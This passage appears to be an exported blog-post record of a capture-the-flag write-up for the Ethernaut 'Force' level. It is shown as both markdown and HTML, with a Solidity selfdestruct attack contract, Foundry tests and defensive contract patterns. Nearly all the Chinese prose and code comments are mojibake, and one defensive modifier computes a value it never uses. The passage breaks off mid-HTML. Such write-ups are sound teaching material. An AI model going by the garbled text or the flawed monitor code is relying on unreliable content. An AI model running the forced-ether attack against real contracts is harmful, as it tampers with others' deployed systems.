å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•\n\n```solidity\ncontract AlternativeAttacks {\n    // æ–¹æ³• 2: é¢„è®¡ç®—åœ°å€ (å®é™…ä¸­å¾ˆéš¾å®ç°)\n    function preComputedAttack() public payable {\n        // 1. è®¡ç®—ç›®æ ‡åˆçº¦çš„æœªæ¥éƒ¨ç½²åœ°å€\n        // 2. å‘è¯¥åœ°å€å‘é€ä»¥å¤ªå¸\n        // 3. åœ¨è¯¥åœ°å€éƒ¨ç½²ç›®æ ‡åˆçº¦\n        // æ³¨æ„ï¼šè¿™éœ€è¦æ§åˆ¶éƒ¨ç½²æ—¶æœºï¼Œå®é™…ä¸­å¾ˆå›°éš¾\n    }\n    \n    // æ–¹æ³• 3: ä½œä¸ºçŸ¿å·¥è®¾ç½® coinbase (ä»…ç†è®ºä¸Šå¯èƒ½)\n    function coinbaseAttack() public {\n        // å¦‚æœä½ æ˜¯çŸ¿å·¥ï¼Œå¯ä»¥å°†ç›®æ ‡åœ°å€è®¾ä¸º coinbase\n        // æŒ–çŸ¿å¥–åŠ±ä¼šç›´æ¥å‘é€åˆ°è¯¥åœ°å€\n        // ä½†è¿™éœ€è¦å·¨å¤§çš„ç®—åŠ›æŠ•å…¥\n    }\n}\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­\n\n```solidity\ncontract VulnerableContract {\n    // âŒ å±é™©ï¼šä¾èµ–åˆçº¦ä½™é¢\n    function withdraw() public {\n        require(address(this).balance == 0, \"Contract must be empty\");\n        // å¯è¢« selfdestruct æ”»å‡»ç»•è¿‡\n    }\n}\n\ncontract SafeContract {\n    uint256 private internalBalance;\n    \n    // âœ… å®‰å…¨ï¼šä½¿ç”¨å†…éƒ¨è®°è´¦\n    function deposit() public payable {\n        internalBalance += msg.value;\n    }\n    \n    function withdraw() public {\n        require(internalBalance == 0, \"Internal balance must be zero\");\n        // æ— æ³•è¢«å¤–éƒ¨å¼ºåˆ¶ä¿®æ”¹\n    }\n}\n```\n\n### 2. ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡\n\n```solidity\ncontract SecureForce {\n    uint256 private receivedAmount;\n    \n    receive() external payable {\n        receivedAmount += msg.value;\n    }\n    \n    function getReceivedAmount() public view returns (uint256) {\n        return receivedAmount; // åªè®¡ç®—ä¸»åŠ¨æ¥æ”¶çš„ä»¥å¤ªå¸\n    }\n    \n    function getTotalBalance() public view returns (uint256) {\n        return address(this).balance; // åŒ…æ‹¬å¼ºåˆ¶å‘é€çš„ä»¥å¤ªå¸\n    }\n}\n```\n\n### 3. æ£€æŸ¥ä½™é¢å˜åŒ–\n\n```solidity\ncontract BalanceMonitor {\n    uint256 private lastKnownBalance;\n    \n    modifier balanceCheck() {\n        uint256 balanceBefore = address(this).balance;\n        _;\n        uint256 balanceAfter = address(this).balance;\n        \n        // æ£€æµ‹æ„å¤–çš„ä½™é¢å˜åŒ–\n        if (balanceAfter != lastKnownBalance) {\n            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);\n        }\n        \n        lastKnownBalance = balanceAfter;\n    }\n    \n    event UnexpectedBalanceChange(uint256 expected, uint256 actual);\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### selfdestruct æœºåˆ¶\n\n```solidity\ncontract SelfDestructExample {\n    constructor() payable {}\n    \n    function destroy(address payable recipient) public {\n        // selfdestruct ä¼šï¼š\n        // 1. é”€æ¯åˆçº¦ä»£ç \n        // 2. å°†æ‰€æœ‰ä»¥å¤ªå¸å‘é€ç»™ recipient\n        // 3. å¼ºåˆ¶å‘é€ï¼Œæ— æ³•è¢«é˜»æ­¢\n        selfdestruct(recipient);\n    }\n}\n```\n\n### åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼\n\n| æ–¹å¼ | å¯è¢«é˜»æ­¢ | è¯´æ˜ |\n|------|----------|------|\n| **æ­£å¸¸è½¬è´¦** | âœ… æ˜¯ | éœ€è¦ payable å‡½æ•° |\n| **selfdestruct** | âŒ å¦ | å¼ºåˆ¶å‘é€ï¼Œæ— æ³•æ‹’ç» |\n| **é¢„è®¡ç®—åœ°å€** | âŒ å¦ | å‘é€åˆ°æœªæ¥åœ°å€ |\n| **çŸ¿å·¥å¥–åŠ±** | âŒ å¦ | Coinbase å¥–åŠ± |\n\n### å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ\n\n```solidity\n// âŒ ä¸å®‰å…¨çš„æ¨¡å¼\ncontract BadPattern {\n    function criticalFunction() public {\n        require(address(this).balance == 0, \"Must be empty\");\n        // é€»è¾‘...\n    }\n}\n\n// âœ… å®‰å…¨çš„æ¨¡å¼  \ncontract GoodPattern {\n    uint256 private expectedBalance;\n    \n    function criticalFunction() public {\n        require(expectedBalance == 0, \"Expected balance must be zero\");\n        // é€»è¾‘...\n    }\n    \n    function updateExpectedBalance(uint256 amount) private {\n        expectedBalance = amount;\n    }\n}\n```\n\n## ğŸ¯ æ€»ç»“\n\nForce å…³å¡æ•™å¯¼äº†é‡è¦çš„ä»¥å¤ªå¸å¤„ç†åŸåˆ™ï¼š\n\n- âœ… **æ°¸è¿œä¸è¦ä¾èµ– `address(this).balance`** - å¯ä»¥è¢«å¼ºåˆ¶ä¿®æ”¹\n- âœ… **ä½¿ç”¨å†…éƒ¨çŠ¶æ€è·Ÿè¸ªä½™é¢** - æ›´åŠ å®‰å…¨å¯é \n- âœ… **ç†è§£ selfdestruct çš„å¼ºåˆ¶æ€§** - æ— æ³•è¢«åˆçº¦æ‹’ç»\n- âœ… **è®¾è®¡æ—¶è€ƒè™‘æ„å¤–èµ„é‡‘** - å¤„ç†éé¢„æœŸçš„ä»¥å¤ªå¸\n\nè¿™ä¸ªçœ‹ä¼¼ç®€å•çš„æ”»å‡»æ­ç¤ºäº†ä»¥å¤ªåŠè™šæ‹Ÿæœºå±‚é¢çš„é‡è¦ç‰¹æ€§ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**\n- **[ä¸‹ä¸€å…³: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","slug":"ethernaut-level-07-force","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp8000tbf5q18483v61","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-7-Force-å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-7-Force-å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/7\">Ethernaut Level 7 - Force</a><br><strong>æ”»å‡»ç±»å‹</strong>: å¼ºåˆ¶è½¬è´¦ã€selfdestruct åˆ©ç”¨<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><ol>\n<li><strong>å‘åˆçº¦å‘é€ä»¥å¤ªå¸</strong> - è®© <code>Force</code> åˆçº¦çš„ä½™é¢å¤§äº 0</li>\n<li><strong>ç»•è¿‡æ¥æ”¶é™åˆ¶</strong> - åˆçº¦æ²¡æœ‰ payable å‡½æ•°æˆ– fallback</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Force &#123;/*</span><br><span class=\"line\">                   MEOW ?</span><br><span class=\"line\">         /\\_/\\   /</span><br><span class=\"line\">    ____/ o o \\</span><br><span class=\"line\">  /~____  =Ã¸= /</span><br><span class=\"line\"> (______)__m_m)</span><br><span class=\"line\">*/&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>å…³é”®é—®é¢˜</strong>ï¼š</p>\n<ul>\n<li>åˆçº¦å®Œå…¨ç©ºç™½ï¼Œæ²¡æœ‰ä»»ä½•å‡½æ•°</li>\n<li>æ²¡æœ‰ <code>payable</code> å‡½æ•°æˆ– <code>fallback/receive</code> å‡½æ•°</li>\n<li>æ­£å¸¸æƒ…å†µä¸‹æ— æ³•æ¥æ”¶ä»¥å¤ªå¸</li>\n</ul>\n<h3 id=\"å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•\"><a href=\"#å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•\" class=\"headerlink\" title=\"å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•\"></a>å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•</h3><p>å°½ç®¡åˆçº¦æ‹’ç»æ¥æ”¶ä»¥å¤ªå¸ï¼Œä½†æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å¼ºåˆ¶å‘é€ï¼š</p>\n<ol>\n<li><strong>selfdestruct()</strong> - åˆçº¦è‡ªæ¯æ—¶å¼ºåˆ¶è½¬ç§»ä½™é¢ â­</li>\n<li><strong>é¢„è®¡ç®—åœ°å€æŒ–çŸ¿</strong> - å‘æœªæ¥åœ°å€é¢„å…ˆå‘é€ä»¥å¤ªå¸</li>\n<li><strong>Coinbase å¥–åŠ±</strong> - ä½œä¸ºçŸ¿å·¥å¥–åŠ±æ¥æ”¶åœ°å€</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// ç›®æ ‡åˆçº¦ - å®Œå…¨ç©ºç™½</span><br><span class=\"line\">contract Force &#123;</span><br><span class=\"line\">    // ç©ºåˆçº¦ï¼Œæ— æ³•æ­£å¸¸æ¥æ”¶ä»¥å¤ªå¸</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ForceAttacker &#123;</span><br><span class=\"line\">    constructor() payable &#123;</span><br><span class=\"line\">        // æ„é€ å‡½æ•°æ¥æ”¶ä»¥å¤ªå¸</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack(address payable target) public &#123;</span><br><span class=\"line\">        // ğŸ¯ å…³é”®æ”»å‡»ï¼šä½¿ç”¨ selfdestruct å¼ºåˆ¶å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        selfdestruct(target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ForceTest is Test &#123;</span><br><span class=\"line\">    Force public force;</span><br><span class=\"line\">    ForceAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user = makeAddr(&quot;user&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½² Force åˆçº¦</span><br><span class=\"line\">        force = new Force();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™ç”¨æˆ·ä¸€äº›ä»¥å¤ªå¸</span><br><span class=\"line\">        vm.deal(user, 10 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testForceExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;=== æ”»å‡»å‰çŠ¶æ€ ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Force åˆçº¦ä½™é¢:&quot;, address(force).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        attacker = new ForceAttacker&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;æ”»å‡»åˆçº¦ä½™é¢:&quot;, address(attacker).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ğŸ¯ æ‰§è¡Œæ”»å‡»ï¼šè‡ªæ¯å¹¶å¼ºåˆ¶å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        attacker.attack(payable(address(force)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== æ”»å‡»åçŠ¶æ€ ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Force åˆçº¦ä½™é¢:&quot;, address(force).balance);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»åˆçº¦ä½™é¢:&quot;, address(attacker).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertGt(address(force).balance, 0);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»æˆåŠŸï¼Force åˆçº¦ç°åœ¨æœ‰ä»¥å¤ªå¸äº†&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testNormalTransferFails() public &#123;</span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å°è¯•æ­£å¸¸å‘é€ä»¥å¤ªå¸ - åº”è¯¥å¤±è´¥</span><br><span class=\"line\">        (bool success,) = address(force).call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;æ­£å¸¸è½¬è´¦å¤±è´¥ï¼Œå¦‚é¢„æœŸ&quot;);</span><br><span class=\"line\">        assertEq(address(force).balance, 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPreComputedAddress() public &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºé¢„è®¡ç®—åœ°å€æ–¹æ³•</span><br><span class=\"line\">        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å‘æœªæ¥åœ°å€å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        (bool success,) = futureAddress.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success); // åœ°å€ä¸å­˜åœ¨ï¼Œå‘é€å¤±è´¥</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;é¢„è®¡ç®—åœ°å€:&quot;, futureAddress);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•\"><a href=\"#å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•\" class=\"headerlink\" title=\"å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•\"></a>å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract AlternativeAttacks &#123;</span><br><span class=\"line\">    // æ–¹æ³• 2: é¢„è®¡ç®—åœ°å€ (å®é™…ä¸­å¾ˆéš¾å®ç°)</span><br><span class=\"line\">    function preComputedAttack() public payable &#123;</span><br><span class=\"line\">        // 1. è®¡ç®—ç›®æ ‡åˆçº¦çš„æœªæ¥éƒ¨ç½²åœ°å€</span><br><span class=\"line\">        // 2. å‘è¯¥åœ°å€å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        // 3. åœ¨è¯¥åœ°å€éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        // æ³¨æ„ï¼šè¿™éœ€è¦æ§åˆ¶éƒ¨ç½²æ—¶æœºï¼Œå®é™…ä¸­å¾ˆå›°éš¾</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // æ–¹æ³• 3: ä½œä¸ºçŸ¿å·¥è®¾ç½® coinbase (ä»…ç†è®ºä¸Šå¯èƒ½)</span><br><span class=\"line\">    function coinbaseAttack() public &#123;</span><br><span class=\"line\">        // å¦‚æœä½ æ˜¯çŸ¿å·¥ï¼Œå¯ä»¥å°†ç›®æ ‡åœ°å€è®¾ä¸º coinbase</span><br><span class=\"line\">        // æŒ–çŸ¿å¥–åŠ±ä¼šç›´æ¥å‘é€åˆ°è¯¥åœ°å€</span><br><span class=\"line\">        // ä½†è¿™éœ€è¦å·¨å¤§çš„ç®—åŠ›æŠ•å…¥</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­\"><a href=\"#1-é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­\" class=\"headerlink\" title=\"1. é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­\"></a>1. é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract VulnerableContract &#123;</span><br><span class=\"line\">    // âŒ å±é™©ï¼šä¾èµ–åˆçº¦ä½™é¢</span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        require(address(this).balance == 0, &quot;Contract must be empty&quot;);</span><br><span class=\"line\">        // å¯è¢« selfdestruct æ”»å‡»ç»•è¿‡</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeContract &#123;</span><br><span class=\"line\">    uint256 private internalBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // âœ… å®‰å…¨ï¼šä½¿ç”¨å†…éƒ¨è®°è´¦</span><br><span class=\"line\">    function deposit() public payable &#123;</span><br><span class=\"line\">        internalBalance += msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        require(internalBalance == 0, &quot;Internal balance must be zero&quot;);</span><br><span class=\"line\">        // æ— æ³•è¢«å¤–éƒ¨å¼ºåˆ¶ä¿®æ”¹</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡\"><a href=\"#2-ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡\" class=\"headerlink\" title=\"2. ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡\"></a>2. ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureForce &#123;</span><br><span class=\"line\">    uint256 private receivedAmount;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        receivedAmount += msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getReceivedAmount() public view returns (uint256) &#123;</span><br><span class=\"line\">        return receivedAmount; // åªè®¡ç®—ä¸»åŠ¨æ¥æ”¶çš„ä»¥å¤ªå¸</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getTotalBalance() public view returns (uint256) &#123;</span><br><span class=\"line\">        return address(this).balance; // åŒ…æ‹¬å¼ºåˆ¶å‘é€çš„ä»¥å¤ªå¸</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ£€æŸ¥ä½™é¢å˜åŒ–\"><a href=\"#3-æ£€æŸ¥ä½™é¢å˜åŒ–\" class=\"headerlink\" title=\"3. æ£€æŸ¥ä½™é¢å˜åŒ–\"></a>3. æ£€æŸ¥ä½™é¢å˜åŒ–</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract BalanceMonitor &#123;</span><br><span class=\"line\">    uint256 private lastKnownBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier balanceCheck() &#123;</span><br><span class=\"line\">        uint256 balanceBefore = address(this).balance;</span><br><span class=\"line\">        _;</span><br><span class=\"line\">        uint256 balanceAfter = address(this).balance;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ£€æµ‹æ„å¤–çš„ä½™é¢å˜åŒ–</span><br><span class=\"line\">        if (balanceAfter != lastKnownBalance) &#123;</span><br><span class=\"line\">            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        lastKnownBalance = balanceAfter;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event UnexpectedBalanceChange(uint256 expected, uint256 actual);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"selfdestruct-æœºåˆ¶\"><a href=\"#selfdestruct-æœºåˆ¶\" class=\"headerlink\" title=\"selfdestruct æœºåˆ¶\"></a>selfdestruct æœºåˆ¶</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SelfDestructExample &#123;</span><br><span class=\"line\">    constructor() payable &#123;&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function destroy(address payable recipient) public &#123;</span><br><span class=\"line\">        // selfdestruct ä¼šï¼š</span><br><span class=\"line\">        // 1. é”€æ¯åˆçº¦ä»£ç </span><br><span 